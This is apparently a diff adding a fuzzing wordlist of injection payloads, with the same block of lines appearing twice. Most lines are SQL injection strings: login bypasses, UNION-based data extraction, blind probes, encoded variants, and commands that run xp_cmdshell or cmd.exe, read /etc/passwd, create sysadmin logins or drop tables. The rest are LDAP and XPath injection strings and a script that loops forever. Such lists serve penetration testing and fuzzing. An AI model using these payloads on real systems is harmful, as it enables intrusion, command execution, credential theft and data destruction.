@@ -1,0 +1,258 @@
+'
+1 OR 1=1
+1' OR '1'='1
+1'1
+1 EXEC XP_
+1 EXEC SP_ (or EXEC XP_)
+1 AND 1=1
+1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+1 AND USER_NAME() = 'dbo'
+'; DESC users; --
+EXIT SUB--
+EXIT SUB
+1'1
+1' AND non_existant_table = '1
+' OR username IS NOT NULL OR username = '
+1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
+1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
+1 UNI/**/ON SELECT ALL FROM WHERE
+%31%27%20%4F%52%20%27%31%27%3D%27%31
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;
+&#49&#39&#32&#79&#82&#32&#39&#49&#39&#61&#39&#49
+' UNION SELECT 1,1,1 FROM validTableName%00
+' AND (SELECT TOP 1 'someData' FROM validTableName)%00
+' UNION SELECT TOP 3 AttrName FROM validTableName%00
+' AND 1=0 UNION SELECT AttrName1,AttrName2 FROM validTableName%00
+' UNION SELECT 'web' %2b 'app' FROM validTableName%00
+' UNION SELECT 'web' %26 'app' FROM validTableName%00
+' UNION SELECT MID('abcd',1,1) FROM validTableName%00
+' UNION SELECT MID('abcd',2,1) FROM validTableName%00
+' UNION SELECT CurDir(),1,1 FROM validTableName%00
+' AND SHELL('cmd.exe /c echo owned > c:\path\name\index.html')%00
+' GROUP BY Id, SecondAttrName, ...%00
+' OR 1=1%00
+' UNION SELECT fieldName[j],1,1,1 FROM validTableName%00
+' UNION SELECT 1 FROM table[i]%00
+' UNION SELECT name FROM msysobjects IN '\boot.ini'%00
+' UNION SELECT IIF(1=1, 'a', 'b') FROM validTableName%00
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CRATE USER name IDENTIFIED BY 'pass123'
+CRATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users;
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1--
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > @var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+|
+!
+(
+)
+%28
+%29
+&
+%26
+%21
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+'+or+'1'='1
+'+or+''='
+x'+or+1=1+or+'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x'+or+name()='username'+or+'x'='y
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+'
+1 OR 1=1
+1' OR '1'='1
+1'1
+1 EXEC XP_
+1 EXEC SP_ (or EXEC XP_)
+1 AND 1=1
+1' AND 1=(SELECT COUNT(*) FROM tablenames); --
+1 AND USER_NAME() = 'dbo'
+'; DESC users; --
+EXIT SUB--
+EXIT SUB
+1'1
+1' AND non_existant_table = '1
+' OR username IS NOT NULL OR username = '
+1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
+1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
+1 UNI/**/ON SELECT ALL FROM WHERE
+%31%27%20%4F%52%20%27%31%27%3D%27%31
+&#x31;&#x27;&#x20;&#x4F;&#x52;&#x20;&#x27;&#x31;&#x27;&#x3D;&#x27;&#x31;
+&#49&#39&#32&#79&#82&#32&#39&#49&#39&#61&#39&#49
+' UNION SELECT 1,1,1 FROM validTableName%00
+' AND (SELECT TOP 1 'someData' FROM validTableName)%00
+' UNION SELECT TOP 3 AttrName FROM validTableName%00
+' AND 1=0 UNION SELECT AttrName1,AttrName2 FROM validTableName%00
+' UNION SELECT 'web' %2b 'app' FROM validTableName%00
+' UNION SELECT 'web' %26 'app' FROM validTableName%00
+' UNION SELECT MID('abcd',1,1) FROM validTableName%00
+' UNION SELECT MID('abcd',2,1) FROM validTableName%00
+' UNION SELECT CurDir(),1,1 FROM validTableName%00
+' AND SHELL('cmd.exe /c echo owned > c:\path\name\index.html')%00
+' GROUP BY Id, SecondAttrName, ...%00
+' OR 1=1%00
+' UNION SELECT fieldName[j],1,1,1 FROM validTableName%00
+' UNION SELECT 1 FROM table[i]%00
+' UNION SELECT name FROM msysobjects IN '\boot.ini'%00
+' UNION SELECT IIF(1=1, 'a', 'b') FROM validTableName%00
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CRATE USER name IDENTIFIED BY 'pass123'
+CRATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users;
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1--
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > @var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+|
+!
+(
+)
+%28
+%29
+&
+%26
+%21
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+'+or+'1'='1
+'+or+''='
+x'+or+1=1+or+'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x'+or+name()='username'+or+'x'='y
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
